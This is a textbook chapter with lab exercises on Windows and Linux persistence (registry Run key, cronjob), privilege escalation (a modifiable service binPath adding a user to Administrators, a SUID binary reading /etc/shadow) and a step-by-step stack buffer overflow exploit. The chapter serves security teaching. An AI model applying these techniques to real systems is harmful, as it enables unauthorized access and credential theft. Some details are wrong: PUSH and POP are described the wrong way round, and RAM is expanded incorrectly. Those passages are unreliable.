# Persistence and Privilege Escalation
![](endpoint_hacked.jpg)

The previous chapter covered several features of Windows and Linux operating systems that have a security impact.  Some of those features promote security while other features were utilities that could be abused.  In this chapter we will cover some common threat actor techniques after initial compromise.  We will explore some of the activities performed by attackers that are already in victim machines including how attackers gain further access into the compromised system as well as how they maintain their access overtime.  The last section of the chapter focuses on memory issues of applications that can be abused to increase permissions and sometimes obtain initial access to systems.

**Objectives**
1. Understand the post exploitation activities performed by actors after initial compromise.
2. Demonstrate persistence techniques in Windows and Linux operating systems.
3. Conduct privilege escalation methods within compromised systems.
4. Identify buffer overflow vulnerabilities and craft exploits to hijack the application's execution flow.
## Post Exploitation
## Persistence 

Windows Persistence Techniques

> [!activity] Activity - Windows Persistence with Registry

> [!exercise] Exercise - Windows Persistence with Registry
> Using the Windows VM in Bridge Adapter network mode, you will add a Run Registry Key to launch the calculator app as a placeholder for malware.
> #### Step 1 - Add the Key
> Launch a command prompt and add the calc.exe to the Registry’s Run Key.
> ``` powershell
> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotEvil /t REG_SZ /d "C:\Windows\System32\calc.exe“
> ```
> #### Step 2 - Reboot and Execute
> Reboot the Windows VM and observe the calculator app launches at login!
> #### Step 3 - Remove Persistence
> Launch the Registry Editor as Administrator accepting the UAC prompt. Navigate to “Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” and observe the Key “NotEvil”.  Right click the NotEvil entry and Delete.

Linux Persistence Techniques

>[!activity] Activity - Linux Persistence with Cronjob

> [!exercise] Exercise - Linux Persistence with Cronjob
> This task uses the Ubuntu VM in Bridge Adapter mode to schedule a cronjob that launches bash commands as a stand in for malware.
> #### Step 1 - Create the Cronjob
> Launch a bash terminal and add a cronjob that runs the date command and redirects the standard output to cron.txt file on your user’s desktop. Make sure to replace `USER` with your Ubuntu user’s name. Then run crontab -l to review and confirm the job setting.
> ``` bash
> echo "@reboot date > /home/USER/Desktop/cron.txt " | crontab 2> /dev/null
> crontab -l
> ```
> #### Step 2 - Reboot and Exploit
> Reboot the Ubuntu machine, login, and observe the cronjob created a cron.txt file on the desktop!
> #### Step 3 - Remove Persistence
> Open a terminal and remove the cronjob.
> ``` bash
> echo "" | crontab 2> /dev/null
> crontab -l
> ```
## Privilege Escalation
Windows Privilege Escalation Techniques

>[!activity] Activity - Windows Service Privilege Escalation

> [!exercise] Exercise - Windows Service Privilege Escalation
> You will create a vulnerable service and then escalate your privileges by exploiting this service in your Windows VM with Bridge Adapter network mode.
> #### Step 1 - Setup Vulnerable Service
> Start command prompt as administrator and create a vulnerable service that we will use for privilege escalation.
> ``` powershell
> sc create vulnerable binPath= "C:\Windows\system32\SearchIndexer.exe /Embedding”
> ```
> Add User Permissions to modify service. The WD at the end of each Allow statement make each permission set world available.
> ``` powershell
> sc sdset vulnerable "D:(A;;CCLCSWRPWPDTLOCRRC;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWLOCRRC;;;WD)(A;;CCLCSWLOCRRC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
> ```
> #### Step 2 - Tester User
> The tester user may already exist from previous labs. Open a regular command prompt (non-administrator) and check the user list and confirm the tester user is present.
> ``` powershell
> net user
> ```
> If the tester user is not present, create the user.
> ``` powershell
> net user tester /add
> ```
> Confirm the tester user IS NOT present in the Administrators group.
> ```powershell
> net localgroup administrators
> ```
> #### Step 3 - Exploit Service
> As normal login user, launch a command prompt (not as admin). Modify the vulnerable service to add the tester user to the administrators group.
> ``` powershell
> sc config vulnerable binpath= "net localgroup administrators tester /add"
> ```
> Start the vulnerable service to run the payload. Observe that the service “FAILED”.
> ``` powershell
> sc start vulnerable
> ```
> Check administrators again and observe the tester user now has privileges escalated! Even though the service start command failed, it still ran in an elevated context and executed our code.
> ``` powershell
> net localgroup administrators
> ```
> #### Step 4 - Tear Down the Vulnerable Service
> Open a command prompt as administrator
> ``` powershell
> sc delete vulnerable
> ```

Linux Privilege Escalation Techniques

> [!activity] Activity - Linux SUID Privilege Escalation

> [!exercise] Exercise - Linux SUID Privilege Escalation
> In this task you will create a vulnerable SUID binary and then exploit it to escalate privileges to the root user using the Ubuntu VM in Bridge Adapter network mode.
> #### Step 1 - Create Vulnerable SUID
> Install a base64 binary with the root SUID bit set in the current directory. Then list the file and observe it is owned by root and world executable. This means that any user on the system can run the binary as the root user.  Don’t miss the period at the end of the command.
> ``` bash
> sudo install -m =xs $(which base64) .
> ```
> #### Step 2 - Abuse SUID
> As your normal user, try dumping the contents of the shadow file which should only be accessible by root. Observe that permission is denied.
> ``` bash
> cat /etc/shadow
> ```
> Abuse the base64 SUID binary to display the contents of the shadow file. The “./” preceding the base64 binary runs the vulnerable binary located in the current directory. The full command base64 encodes the shadow file and pipes the results to base64 with the decode flag, which displays the full contents of the privileged file!
> ``` bash
> ./base64 "/etc/shadow" | base64 --decode
> ```
## Buffer Overflows
Programs, regardless of the operating system, rely on the use of *read access memory (RAM)* to store code and data to be executed by the CPU.  When a program is ran it loads its code and data into memory where it sits until the CPU is ready to process it.  Lower level programming languages, or programming language compliers or interpreters, manage the program's planned memory utilization during development.  When the program is eventually executed all the prescribed memory space is created.  Sometimes a program will be unaware what inputs it will receive and some amount of memory space will be allocated; however, without proper protections, if the volume of input the program receives exceeds the memory space allotted the program will likely misbehave and crash.  In this section we will explore the basics of how programs interact with the hardware of the system, tools to observe this behavior, and the security implications caused by program memory mismanagement.
### Basics
While this textbook is not meant to teach the reader low level hardware and software interactions, nor is it meant to teach assembly development, we will cover the basics to in an effort to provide a basic working knowledge and conceptual level.  Interested readers who are not already familiar with assembly language development and how memory works inside a computer's operations should research more on the matter.
#### Assembly Language
All higher level programs, such as JavaScript, are eventually translated into instruction *machine code* that the CPU can execute.  **Assembly language** is the lowest level language that all higher level languages are built on top of.  Assembly's hexadecimal encoding, known as *shellcode*, is ultimately what is stored onto memory and processed by the CPU.  Assembly is not a feature rich language and excludes many abstractions higher level languages use.  For example the creation of a raw socket can be quite trivially created in Python with a single line of code whereas this same feat in assembly requires many lines of code excluding the use of functions.  For what assembly is missing in features it makes up for in simplicity.  Only one statement per line is permitted with the a simple syntax of `[label] mnemonic [operands] [;comment]`.  Actually, assembly is deceivingly simple essentially requiring the program to feed piece by piece of data through memory and CPU registers which can require a lot of cognitive load.

The mnemonic section of a statement informs the operation activity to be conducted.  The following non-exhaustive list are some of the more common assembly mnemonics and descriptions:

- MOV - Short for "move" which copies data from one location onto another.
- JMP - Or "jump" instructing the internal pointer to go to another memory location.
- CALL - Run a subroutine.
- RET - "Return" the pointer to another memory location.
- POP - Put data onto the memory stack.
- PUSH - Remove data from the memory stack.
- NOP - Meaning "no operation" where the pointer passes over the statement to the next statement

> [!note] Note - Assembly Mnemonic Full List
> Checkout Wikipedia's x86 Instruction Listings for a richer list of mnemonics. https://en.wikipedia.org/wiki/X86_instruction_listings

#### Registers
The CPU stores data, memory addresses, and instructions within its own non-RAM memory space called **registers**.  Registers are the closest and therefore fastest memory storage location relative to the CPU and all instructions processed by the CPU are managed within registers.  These memory caches are predefined and vary depending on the CPU's architecture.  Regardless of the architecture, all CPUs have registers defined for handling data, addresses, pointers, and general purpose.

| 64-bit | 32-bit | 16-bit | 8-bit | Description |
| ---- | ---- | ---- | ---- | ---- |
| rax | eax | ax | ah & al | Data from returned functions |
| rcx | ecx | cx | ch & cl | Scratch space |
| rdx | edx | dx | dh & dl | Scratch space |
| rbx | ebx | bx | bh & bl | Scratch space |
| rsp | esp | sp | spl | Stack pointer, top of stack |
| rbp | ebp | bp | bpl | Base pointer, bottom of stack |
| rsi | esi | si | sil | Function arguments (2nd) |
| rdi | edi | di | dil | Function argument (1st) |
| r8 - r15 | r8d - r15d | r8w - r15w | r8b - r15b | Scratch space |
| rip | eip |  |  | Instruction pointer |
Having a firm understanding of these registers are needed in order to debug and analyze how a program interacts with memory.
#### Address Space
Stack and Heap
### Debuggers
Endianness
### Overflow Security
Buffer Overflows
stack vs heap

> [!activity] Activity - Stack Smashing the Hidden Funciton

> [!exercise] Exercise - Stack Smashing the Hidden Function
> In this task you will exploit a stack-based buffer overflow vulnerable C program using your Kali VM in Bridge Adapter network mode.  You will install the needed tools, build the vulnerable application, discover the buffer overflow, then build an exploit that will execute the hidden function.
> #### Step 1 - Install GDB
> GNU debugger (GDB) is used to debug in-memory applications and is very useful for finding and exploiting buffer overflows. First update your system and then install gdb.  Accept default settings in prompts by pressing enter.
> ``` bash
> sudo apt update -y
> sudo apt install gdb -y
> ```
> #### Step 2 - Install Peda
> Next, install Peda after GDB is installed. The peda extension for GDB offers additional utilities.
> ``` bash
> git clone [https://github.com/longld/peda.git](https://github.com/longld/peda.git) ~/peda
> echo "source ~/peda/peda.py" >> ~/.gdbinit
> ```
> #### Step 3 - Create the Vulnerable Binary
> Create a C program using the following code and then compile it without any security settings.
> ```bash
> vi program.c 
> ```
> While in the editor, add the following code.
> ``` c
> #include <stdio.h>  
> void hidden(){  
>         printf("Congrats, you found me!\n");  
> }  
> int main(){  
>	 char buffer[100];  
>         gets(buffer);  
>         printf("Buffer Content is : %s\n",buffer);  
> }
> ```
> Once the file is created, compile it using gcc.
> ``` bash 
> gcc  -no-pie -fno-stack-protector -z execstack program.c -o program
> ```
> #### Step 4 - Disable ASLR
> Left enabled, ASLR will randomize the program’s addresses each time it is ran.  You will disable this security setting for ease of demonstration.
> ``` bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
> #### Step 5 - Explore the Binary
> Explore the application by running it and entering a short value.  *Note, you may need to update the program’s permissions to allow execution.*
> ``` bash
> chmod +x program
> ./program
> ```
> Then enter “lol” and observe the program outputs the buffer content.
> #### Step 6 - Find the Overflow
> Create an input file of all “A”s then run it in the GDB debugger. Observe the RBP register is filled with the letter “A” or 0x41 in hex.
> ```bash
> python -c "print('A' *200)" > input.txt
> gdb -q ./program
> ```
> While in GDB, execute the following command to run the application with the input file and observe a segmentation fault (overflow).
> ``` gdb
> run < input.txt
> ```
> #### Step 7 - Find the Offset
> Create a nonrepeating pattern and run it in the program to detect which byte/character position overwrites the RIP pointer register.  While in GDB run the following commands
> ``` gdb
> pattern create 125 pattern.txt
> run < pattern.txt
> ```
> The program will crash at a return address. This address, which is located in the RIP register as well as the last line of GDB output, isn’t a real address. It is in fact a segment of our pattern that was overwritten to the RIP. The RIP expects an address for a value but received our pattern text which doesn’t point to a real address so the program crashed. You can use this fake address value and lookup what offset position it is in as part of our full pattern. Make sure to replace `ADDRESS` with the value you detected. The offset may be 120 characters.  While in GDB run the following:
> ``` gdb
> pattern offset ADDRESS
> ```
> #### Step 8 - Verify RIP
> Open another terminal and create a rip.txt file payload that is designed to overwrite the RIP with the letter “B” (\x42). Then run the program with the rip.txt input within GDB.  While in a terminal (not GDB), run the following to create the rip.txt file.
> ```bash
> python -c 'print("A"*120+"BBBBBB")' > rip.txt
> ```
> In the GDB terminal, run the following to execute the binary with the rip.txt file.
> ```gdb
> run < rip.txt
> ```
> Observe the RIP/overflow address is 0x000042424242! 42 in hex is the letter B, so you have now proven we can overwrite the RIP address pointer with any value of our choosing and can hijack the program to run anything you want.
> #### Step 9 - Find Hidden Function Address
> Now that you control the RIP, you want to redirect the program to the hidden function. You must first determine the hidden functions address space in memory.  Run the following command while in GDB to identify the memory address of the hidden function (Eg “0x401146”).
> ```gdb
> p hidden
> ```
> #### Step 10 - Exploit Payload
> Craft exploit to point RIP to hidden function address. Remember little endian format which places the 6 bytes in reverse order and uses 00 for any missing bytes. In your non GDB terminal, craft an exploit.txt replacing the RIP section (Bs) with the hidden function’s address in little endian format. Use the hidden function's address discovered during the previous step which is 3 bytes long. Prepend three sets of 00s to make the address 6 bytes long (Eg "0x000000401146"). Next reverse each byte position remembering that a byte is 2 characters (Eg "461140000000"). Finally format each byte with a preceding “\x” which is acceptable shellcode (Eg "\x46\x11\x40\x00\x00\x00"). Use this value in the following command's `SHELLCODE` placeholder.  From a non GDB terminal, run the following command to create the exploit.txt file, make sure to change your little endian address if/as needed.
> ```
> python -c 'print("A"*120+"SHELLCODE")' > exploit.txt
> ```
> Observe hidden function message “Congrats, you found me!”!
